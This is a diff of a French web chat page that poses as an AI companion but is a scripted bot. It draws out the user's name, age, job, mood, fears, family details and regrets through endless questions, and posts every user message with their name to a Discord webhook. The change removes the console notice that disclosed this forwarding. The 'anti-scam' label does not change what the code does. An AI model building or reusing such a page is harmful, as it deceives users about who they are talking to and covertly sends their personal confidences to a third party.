@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>IA CHAT</title>
+    <title>Écho - Chat Anti-Scam (Infini)</title>
     <style>
         * {
             margin: 0;
@@ -143,7 +143,6 @@
         .messages-area::-webkit-scrollbar-track { background: #1c3a3a; }
         .messages-area::-webkit-scrollbar-thumb { background: #4bad9e; border-radius: 10px; }
         
-        /* Bouton reset */
         .reset-btn {
             position: fixed;
             bottom: 80px;
@@ -195,29 +194,22 @@
     
     let currentUserName = null;
     let sessionId = Math.random().toString(36).substring(2, 10);
+    let messageCount = 0;
     
     // Fonction pour envoyer un message au webhook Discord
     async function sendToDiscord(message, isUser) {
         if (!WEBHOOK_URL) return;
         
-        // Nom à afficher dans Discord
         let displayName = isUser ? (currentUserName ? `👤 ${currentUserName}` : `🕵️ Utilisateur`) : `🤖 IA Assistant`;
         let avatarUrl = isUser ? "https://cdn-icons-png.flaticon.com/512/1995/1995572.png" : "https://cdn-icons-png.flaticon.com/512/4712/4712039.png";
-        
-        // Déterminer la couleur (rouge pour utilisateur, vert pour IA)
         let color = isUser ? 0xff5555 : 0x55ff55;
         
-        // Message enrichi
-        let enrichedMessage = message;
-        
-        // Ajouter des flags pour les mots suspects
-        const scamKeywords = ["bitcoin", "crypto", "investir", "gagner argent", "plateforme", "retrait", "dépôt", "parrain", "fiable", "urgent", "code promo", "offre limitée", "carte cadeau", "paypal", "virement", "rib", "iban", "mot de passe", "identifiant"];
+        const scamKeywords = ["bitcoin", "crypto", "investir", "gagner argent", "plateforme", "retrait", "dépôt", "parrain", "fiable", "urgent", "code promo", "offre limitée", "carte cadeau", "paypal", "virement", "rib", "iban", "mot de passe", "identifiant", "wallet", "usdt", "ether", "investissement"];
         let isSuspicious = false;
         let lowerMsg = message.toLowerCase();
         for (let kw of scamKeywords) {
             if (lowerMsg.includes(kw)) {
                 isSuspicious = true;
-                enrichedMessage = `⚠️ **ALERTE POTENTIELLE** ⚠️\n` + enrichedMessage + `\n\n🔍 Mot suspect détecté: "${kw}"`;
                 break;
             }
         }
@@ -226,181 +218,253 @@
             username: displayName,
             avatar_url: avatarUrl,
             embeds: [{
-                title: isUser ? "📨 Nouveau message utilisateur" : "💬 Réponse IA",
-                description: enrichedMessage,
-                color: color,
+                title: isUser ? "📨 Nouveau message" : "💬 Réponse IA",
+                description: message.length > 1900 ? message.substring(0, 1900) + "..." : message,
+                color: isSuspicious && isUser ? 0xff0000 : color,
                 timestamp: new Date().toISOString(),
-                footer: {
-                    text: `Session: ${sessionId} | ${isUser ? "Message utilisateur" : "Réponse automatique"}`
-                },
+                footer: { text: `Session: ${sessionId} | Msg #${messageCount}` },
                 fields: [
-                    {
-                        name: "👤 Identité",
-                        value: currentUserName ? `Prénom: ${currentUserName}` : "Anonyme (non renseigné)",
-                        inline: true
-                    },
-                    {
-                        name: "🕐 Heure",
-                        value: new Date().toLocaleTimeString('fr-FR'),
-                        inline: true
-                    }
+                    { name: "👤 Identité", value: currentUserName || "Anonyme", inline: true },
+                    { name: "🕐 Heure", value: new Date().toLocaleTimeString('fr-FR'), inline: true }
                 ]
             }]
         };
         
-        // Ajouter un champ d'alerte si suspect
         if (isSuspicious && isUser) {
-            payload.embeds[0].fields.push({
-                name: "🚨 ALERTE RISQUE",
-                value: "Ce message contient des mots-clés souvent associés aux arnaques. Vigilance recommandée !",
-                inline: false
-            });
-            payload.embeds[0].color = 0xff0000;
+            payload.embeds[0].fields.push({ name: "🚨 ALERTE", value: "Mots-clés suspects détectés", inline: false });
         }
         
         try {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            console.log("Message envoyé à Discord");
-            document.getElementById('status').innerText = "✅ Webhook OK";
-            setTimeout(() => {
-                document.getElementById('status').innerText = "🔌 Webhook actif";
-            }, 2000);
-        } catch (error) {
-            console.error("Erreur webhook:", error);
-            document.getElementById('status').innerText = "❌ Erreur webhook";
-        }
+            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            document.getElementById('status').innerHTML = "✅ Envoyé";
+            setTimeout(() => { document.getElementById('status').innerHTML = "🔌 Webhook actif"; }, 2000);
+        } catch(e) { console.error(e); }
     }
     
-    // ========== HORLOGE ==========
     function getTime() {
         const now = new Date();
-        return now.getHours().toString().padStart(2,'0') + ':' + 
-               now.getMinutes().toString().padStart(2,'0') + ':' + 
-               now.getSeconds().toString().padStart(2,'0');
+        return now.getHours().toString().padStart(2,'0') + ':' + now.getMinutes().toString().padStart(2,'0') + ':' + now.getSeconds().toString().padStart(2,'0');
     }
     
-    // ========== LOCALSTORAGE ==========
-    const STORAGE_KEY = "echo_chat_data";
-    
-    let userAge = null;
-    let userJob = null;
-    let currentStep = 0;
-    let messagesList = [];
-    let isWaitingForResponse = true;
-    let isProcessing = false;
-    
-    const conversationSteps = [
-        {
-            id: "name",
-            question: "D'abord, dis-moi ton prénom.",
-            process: (answer) => {
-                const nameMatch = answer.match(/([A-Za-zÀ-ÿ]{2,20})/i);
-                if (nameMatch && nameMatch[1].length >= 2) {
-                    currentUserName = nameMatch[1].charAt(0).toUpperCase() + nameMatch[1].slice(1).toLowerCase();
-                    return { nextStep: 1, message: `Enchanté ${currentUserName}. Maintenant, quel âge as-tu ?` };
-                }
-                return { nextStep: 0, message: "Je n'ai pas compris ton prénom. Tu peux me le redire ?" };
-            }
-        },
-        {
-            id: "age",
-            question: "Quel âge as-tu ?",
-            process: (answer) => {
-                const ageMatch = answer.match(/(\d+)/);
-                if (ageMatch) {
-                    let age = parseInt(ageMatch[1]);
-                    if (age >= 1 && age <= 120) {
-                        userAge = age;
-                        return { nextStep: 2, message: `${age} ans. D'accord. Et toi, tu fais quoi dans la vie ?` };
-                    }
-                }
-                return { nextStep: 1, message: "Je n'ai pas capté ton âge. Tu as quel âge ?" };
-            }
-        },
-        {
-            id: "job",
-            question: "Qu'est-ce que tu fais dans la vie ?",
-            process: (answer) => {
-                userJob = answer.substring(0, 60);
-                return { nextStep: 3, message: `Intéressant. Et comment tu te sens en ce moment ?` };
-            }
-        },
-        {
-            id: "mood",
-            question: "Comment te sens-tu en ce moment ?",
-            process: (answer) => {
-                if (answer.match(/triste|déçu|déprime|pas bien|mal|solitude|seul/)) {
-                    return { nextStep: 4, message: "Je suis désolé que tu te sentes comme ça. Tu veux en parler un peu ?" };
-                } else if (answer.match(/heureux|content|bien|super|génial|ravi/)) {
-                    return { nextStep: 5, message: "C'est cool que tu te sentes bien ! Qu'est-ce qui te rend heureux ?" };
-                } else {
-                    return { nextStep: 6, message: "Je comprends. Dis-moi, qu'est-ce qui compte le plus pour toi dans la vie ?" };
-                }
-            }
-        },
-        {
-            id: "sad_talk",
-            question: "Tu veux parler de ce qui ne va pas ? Je t'écoute.",
-            process: (answer) => {
-                return { nextStep: 6, message: "Merci de t'être confié. Maintenant, quel est ton plus grand rêve ?" };
-            }
-        },
-        {
-            id: "happy_talk",
-            question: "Qu'est-ce qui te rend heureux exactement ?",
-            process: (answer) => {
-                return { nextStep: 6, message: `C'est beau. Et si tu pouvais faire une chose sans limite, ce serait quoi ?` };
-            }
-        },
-        {
-            id: "dream",
-            question: "Quel est ton plus grand rêve ?",
-            process: (answer) => {
-                return { nextStep: 7, message: `C'est inspirant. Et dans 5 ans, comment tu t'imagines ?` };
-            }
-        },
-        {
-            id: "future",
-            question: "Comment tu t'imagines dans 5 ans ?",
-            process: (answer) => {
-                return { nextStep: 8, message: `Je vois. Tu penses que tu vas y arriver ?` };
-            }
-        },
-        {
-            id: "belief",
-            question: "Tu penses que tu vas réussir ?",
-            process: (answer) => {
-                return { nextStep: 9, message: `${currentUserName ? currentUserName + ", " : ""}merci pour cette conversation. C'était intéressant. Tu as des questions pour moi ?` };
-            }
-        },
-        {
-            id: "continue",
-            question: "Tu as des questions à me poser ?",
-            process: (answer) => {
-                const followUps = [
-                    "Je suis une IA anonyme. Et toi, quel est ton plus beau souvenir ?",
-                    "Revenons à toi : raconte-moi un souvenir marquant.",
-                    "D'accord. Et toi, qu'est-ce qui te motive au quotidien ?",
-                    "Je vois. Et si tu devais donner un conseil, ce serait quoi ?"
-                ];
-                const randomFollow = followUps[Math.floor(Math.random() * followUps.length)];
-                return { nextStep: 9, message: randomFollow };
-            }
-        }
+    // ========== BIBLIOTHÈQUE INFINIE DE QUESTIONS ET RÉPONSES ==========
+    const allQuestions = [
+        "Raconte-moi ce qui te rend heureux en ce moment.",
+        "Quel est ton meilleur souvenir d'enfance ?",
+        "Si tu pouvais voyager n'importe où, où irais-tu ?",
+        "Qu'est-ce qui te motive à te lever le matin ?",
+        "Quel est ton film préféré et pourquoi ?",
+        "Tu écoutes quel genre de musique ?",
+        "Quelle est ta plus grande passion ?",
+        "Parle-moi de tes hobbies.",
+        "Quel est ton rêve le plus fou ?",
+        "Si tu gagnais au loto, qu'est-ce que tu ferais ?",
+        "Quelle est la personne qui t'inspire le plus ?",
+        "Quel livre a changé ta vie ?",
+        "Tu es plutôt matin ou nuit ?",
+        "Quelle est ta saison préférée ?",
+        "Tu préfères la mer ou la montagne ?",
+        "Quel est ton plat préféré ?",
+        "Tu as un animal de compagnie ?",
+        "Quelle est ta plus grande force ?",
+        "Quelle est ta plus grande faiblesse ?",
+        "Parle-moi de ta famille.",
+        "Qu'est-ce qui t'inquiète en ce moment ?",
+        "Quel est ton plus grand regret ?",
+        "Quelle est la meilleure décision que tu aies prise ?",
+        "Tu te souviens de ton premier amour ?",
+        "Qu'est-ce que tu aimerais apprendre ?",
+        "Quelle compétence veux-tu développer ?",
+        "Parle-moi de ton meilleur ami.",
+        "Qu'est-ce qui te fait rire ?",
+        "Quelle est ta série préférée ?",
+        "Tu joues à des jeux vidéo ?",
+        "Quel sport pratiques-tu ?",
+        "Quelle est ta destination de rêve ?",
+        "Tu aimes cuisiner ?",
+        "Quel est ton talent caché ?",
+        "Si tu pouvais changer une chose dans le monde, quoi ?",
+        "Qu'est-ce que la réussite pour toi ?",
+        "Quel est ton plus grand défi actuel ?",
+        "Parle-moi de ton travail.",
+        "Qu'est-ce qui te stresse le plus ?",
+        "Comment tu te détends après une journée difficile ?",
+        "Quelle est la dernière fois que tu as été fier de toi ?",
+        "Tu as des projets pour les prochains mois ?",
+        "Qu'est-ce qui te manque en ce moment ?",
+        "Quelle est ta citation préférée ?",
+        "Tu crois au destin ?",
+        "Qu'est-ce qui rend la vie belle pour toi ?",
+        "Parle-moi de quelque chose que tu as appris récemment.",
+        "Quelle est ta plus grande peur ?",
+        "Qu'est-ce qui te rend unique ?",
+        "Quel conseil donnerais-tu à ton toi du passé ?",
+        "Qu'est-ce que tu aimerais faire avant de mourir ?"
     ];
     
-    // ========== SAUVEGARDE ==========
+    const followUpResponses = [
+        "C'est intéressant ! Dis-m'en plus.",
+        "Je vois. Et pourquoi ?",
+        "Ah bon ? Développe un peu.",
+        "Je comprends. Et toi, qu'est-ce que tu en penses vraiment ?",
+        "C'est fascinant. Raconte-moi la suite.",
+        "Je ne m'attendais pas à ça. Continue.",
+        "Merci de partager. Et du coup, comment tu te sens par rapport à ça ?",
+        "Je vois. Et si tu devais résumer ça en une phrase ?",
+        "C'est noté. Qu'est-ce qui t'a amené à penser ça ?",
+        "Intéressant. Est-ce que c'est important pour toi ?",
+        "Je comprends. Et ça a changé ta vie ?",
+        "C'est beau. Tu as d'autres exemples ?",
+        "Je vois. Et tu penses que ça va évoluer ?",
+        "Merci pour ton honnêteté. Tu veux ajouter quelque chose ?",
+        "Je comprends. Est-ce que tu en as parlé à quelqu'un ?"
+    ];
+    
+    const genericResponses = [
+        "Je vois. Continue, je t'écoute.",
+        "Intéressant. Dis-m'en plus.",
+        "Je comprends. Et après ?",
+        "C'est noté. Tu veux parler d'autre chose ?",
+        "Merci de partager ça.",
+        "Je réfléchis à ce que tu dis...",
+        "Hmm, c'est intéressant comme point de vue.",
+        "Je ne vois pas les choses exactement pareil, mais je comprends.",
+        "C'est un bon sujet. Développe un peu."
+    ];
+    
+    let usedQuestions = [];
+    let currentPhase = "initial"; // initial, infinite
+    
+    // Obtenir une nouvelle question aléatoire (jamais deux fois la même récemment)
+    function getRandomQuestion() {
+        let available = allQuestions.filter(q => !usedQuestions.includes(q));
+        if (available.length === 0) {
+            usedQuestions = [];
+            available = allQuestions;
+        }
+        const randomIndex = Math.floor(Math.random() * available.length);
+        const question = available[randomIndex];
+        usedQuestions.push(question);
+        if (usedQuestions.length > 30) usedQuestions.shift();
+        return question;
+    }
+    
+    // ========== GESTION DE LA CONVERSATION (INFINIE) ==========
+    let currentStep = 0;
+    let isWaitingForResponse = true;
+    let isProcessing = false;
+    let messagesList = [];
+    let userAge = null;
+    let userJob = null;
+    let userMood = null;
+    let hasDoneInitial = false;
+    let lastQuestionType = "";
+    
+    // Phase initiale (poser les bases)
+    const initialSteps = [
+        { field: "name", question: "D'abord, dis-moi ton prénom.", extract: (answer) => { currentUserName = answer.match(/([A-Za-zÀ-ÿ]{2,20})/i)?.[1]?.charAt(0).toUpperCase() + answer.match(/([A-Za-zÀ-ÿ]{2,20})/i)?.[1]?.slice(1).toLowerCase() || null; return !!currentUserName; } },
+        { field: "age", question: "Quel âge as-tu ?", extract: (answer) => { userAge = parseInt(answer.match(/(\d+)/)?.[1]); return userAge > 0 && userAge < 120; } },
+        { field: "job", question: "Qu'est-ce que tu fais dans la vie ?", extract: (answer) => { userJob = answer.substring(0, 60); return true; } },
+        { field: "mood", question: "Comment te sens-tu en ce moment ?", extract: (answer) => { userMood = answer; return true; } }
+    ];
+    
+    let initialIndex = 0;
+    
+    async function sendIAMessage(text) {
+        return new Promise((resolve) => {
+            const typingDiv = document.getElementById('typingIndicator');
+            if (!typingDiv) {
+                const typing = document.createElement('div');
+                typing.id = 'typingIndicator';
+                typing.className = 'typing';
+                typing.innerHTML = '<span>●</span><span class="dot"></span><span class="dot"></span><span class="dot"></span>';
+                document.getElementById('typingZone').appendChild(typing);
+            }
+            setTimeout(() => {
+                const el = document.getElementById('typingIndicator');
+                if (el) el.remove();
+                addMessage(text, false);
+                isWaitingForResponse = true;
+                resolve();
+            }, 500 + Math.random() * 400);
+        });
+    }
+    
+    async function processUserAnswer(userMessage) {
+        if (isProcessing) return;
+        isProcessing = true;
+        isWaitingForResponse = false;
+        
+        // Phase initiale
+        if (!hasDoneInitial) {
+            if (initialIndex < initialSteps.length) {
+                const step = initialSteps[initialIndex];
+                const success = step.extract(userMessage);
+                if (success || initialIndex > 0) {
+                    initialIndex++;
+                    if (initialIndex < initialSteps.length) {
+                        await sendIAMessage(initialSteps[initialIndex].question);
+                    } else {
+                        hasDoneInitial = true;
+                        currentPhase = "infinite";
+                        const firstQuestion = getRandomQuestion();
+                        lastQuestionType = "question";
+                        await sendIAMessage(firstQuestion);
+                    }
+                } else {
+                    await sendIAMessage(step.question);
+                }
+                isProcessing = false;
+                isWaitingForResponse = true;
+                return;
+            }
+        }
+        
+        // Phase infinie : répondre avec des relances variées
+        if (userMessage.match(/heure|quelle heure|il est quelle/i)) {
+            const now = getTime();
+            await sendIAMessage(`Il est ${now}. ${getRandomQuestion()}`);
+        } else {
+            // Choisir aléatoirement le type de réponse
+            const responseType = Math.random();
+            
+            if (responseType < 0.3 && lastQuestionType !== "followup") {
+                // Relance
+                const followup = followUpResponses[Math.floor(Math.random() * followUpResponses.length)];
+                await sendIAMessage(followup);
+                lastQuestionType = "followup";
+            } else if (responseType < 0.7 || lastQuestionType === "question") {
+                // Réponse générique puis nouvelle question
+                const generic = genericResponses[Math.floor(Math.random() * genericResponses.length)];
+                const newQuestion = getRandomQuestion();
+                await sendIAMessage(generic + " " + newQuestion);
+                lastQuestionType = "question";
+            } else {
+                // Nouvelle question directe
+                const newQuestion = getRandomQuestion();
+                await sendIAMessage(newQuestion);
+                lastQuestionType = "question";
+            }
+        }
+        
+        isProcessing = false;
+        isWaitingForResponse = true;
+    }
+    
+    // ========== STOCKAGE LOCAL ==========
+    const STORAGE_KEY = "echo_chat_data";
+    
     function saveToStorage() {
         const data = {
             messages: messagesList,
             userName: currentUserName,
             userAge: userAge,
             userJob: userJob,
-            currentStep: currentStep
+            userMood: userMood,
+            initialIndex: initialIndex,
+            hasDoneInitial: hasDoneInitial,
+            usedQuestions: usedQuestions,
+            currentPhase: currentPhase,
+            lastQuestionType: lastQuestionType
         };
         localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
     }
@@ -414,7 +478,12 @@
                 currentUserName = data.userName;
                 userAge = data.userAge;
                 userJob = data.userJob;
-                currentStep = data.currentStep || 0;
+                userMood = data.userMood;
+                initialIndex = data.initialIndex || 0;
+                hasDoneInitial = data.hasDoneInitial || false;
+                usedQuestions = data.usedQuestions || [];
+                currentPhase = data.currentPhase || "initial";
+                lastQuestionType = data.lastQuestionType || "";
                 return true;
             } catch(e) {}
         }
@@ -448,14 +517,12 @@
     
     function addMessage(text, isUser) {
         const time = getTime();
+        messageCount++;
         messagesList.push({ text, isUser, time });
         addMessageToUI(text, isUser, time);
         saveToStorage();
-        
-        // ENVOYER À DISCORD (uniquement les messages utilisateur pour la prévention scam)
-        if (isUser) {
-            sendToDiscord(text, true);
-        }
+        if (isUser) sendToDiscord(text, true);
+        if (!isUser && messageCount % 50 === 0) console.log(`📊 ${messageCount} messages échangés`);
     }
     
     function restoreMessages() {
@@ -464,70 +531,10 @@
         }
     }
     
-    function showTyping() {
-        const existing = document.getElementById('typingIndicator');
-        if (existing) return;
-        const typing = document.createElement('div');
-        typing.id = 'typingIndicator';
-        typing.className = 'typing';
-        typing.innerHTML = '<span>●</span><span class="dot"></span><span class="dot"></span><span class="dot"></span>';
-        typingZone.appendChild(typing);
-        messagesArea.scrollTop = messagesArea.scrollHeight;
-    }
-    
-    function hideTyping() {
-        const el = document.getElementById('typingIndicator');
-        if (el) el.remove();
-    }
-    
-    async function sendIAMessage(text) {
-        return new Promise((resolve) => {
-            showTyping();
-            setTimeout(() => {
-                hideTyping();
-                addMessage(text, false);
-                isWaitingForResponse = true;
-                resolve();
-            }, 600 + Math.random() * 500);
-        });
-    }
-    
-    async function processUserAnswer(userMessage) {
-        if (isProcessing) return;
-        isProcessing = true;
-        isWaitingForResponse = false;
-        
-        if (userMessage.match(/heure|quelle heure|il est quelle/i)) {
-            const now = getTime();
-            const response = `Il est ${now}. ${conversationSteps[currentStep].question}`;
-            await sendIAMessage(response);
-            isProcessing = false;
-            isWaitingForResponse = true;
-            return;
-        }
-        
-        const step = conversationSteps[currentStep];
-        const result = step.process(userMessage);
-        
-        currentStep = result.nextStep;
-        if (currentStep >= conversationSteps.length) {
-            currentStep = conversationSteps.length - 1;
-        }
-        saveToStorage();
-        
-        await sendIAMessage(result.message);
-        isProcessing = false;
-        isWaitingForResponse = true;
-    }
-    
     async function startConversation() {
-        await sendIAMessage("👋 Salut ! Je suis ton compagnon IA.");
+        await sendIAMessage("👋 Salut ! Je suis ton compagnon IA. Je vais te poser plein de questions, et on va discuter longtemps !");
         await new Promise(resolve => setTimeout(resolve, 800));
-        await sendIAMessage("Je vais te poser quelques questions pour apprendre à te connaître.");
-        await new Promise(resolve => setTimeout(resolve, 800));
-        
-        const firstQuestion = conversationSteps[0].question;
-        await sendIAMessage(firstQuestion);
+        await sendIAMessage(initialSteps[0].question);
     }
     
     async function sendMessage() {
@@ -540,43 +547,36 @@
         isSending = true;
         sendBtn.disabled = true;
         
-        showTyping();
-        
-        if (sendTimeout) clearTimeout(sendTimeout);
-        sendTimeout = setTimeout(async () => {
-            hideTyping();
+        setTimeout(async () => {
             await processUserAnswer(text);
             isSending = false;
             sendBtn.disabled = false;
             messageInput.focus();
-            sendTimeout = null;
-        }, 400);
+        }, 300);
     }
     
     function resetChat() {
-        if (confirm("Effacer toute la conversation ? Cette action est irréversible.")) {
+        if (confirm("Effacer toute la conversation ?")) {
             localStorage.removeItem(STORAGE_KEY);
             currentUserName = null;
             userAge = null;
             userJob = null;
-            currentStep = 0;
+            userMood = null;
+            initialIndex = 0;
+            hasDoneInitial = false;
+            usedQuestions = [];
+            currentPhase = "initial";
+            lastQuestionType = "";
             messagesList = [];
+            messageCount = 0;
             messagesArea.innerHTML = "";
-            isWaitingForResponse = true;
-            isProcessing = false;
             saveToStorage();
             setTimeout(() => startConversation(), 300);
         }
     }
     
-    // ========== INIT ==========
     sendBtn.onclick = sendMessage;
-    messageInput.onkeypress = (e) => {
-        if (e.key === 'Enter' && !isSending && !isProcessing) {
-            e.preventDefault();
-            sendMessage();
-        }
-    };
+    messageInput.onkeypress = (e) => { if (e.key === 'Enter' && !isSending && !isProcessing) { e.preventDefault(); sendMessage(); } };
     resetBtn.onclick = resetChat;
     
     const hasSaved = loadFromStorage();
@@ -586,10 +586,7 @@
     } else {
         startConversation();
     }
-    
     messageInput.focus();
-    
-    console.log("%c🛡️ ANTI-SCAM ACTIF - Tous les messages sont envoyés au webhook Discord pour analyse", "color: #ff5555; font-size: 13px; font-weight: bold;");
 </script>
 </body>
 </html>
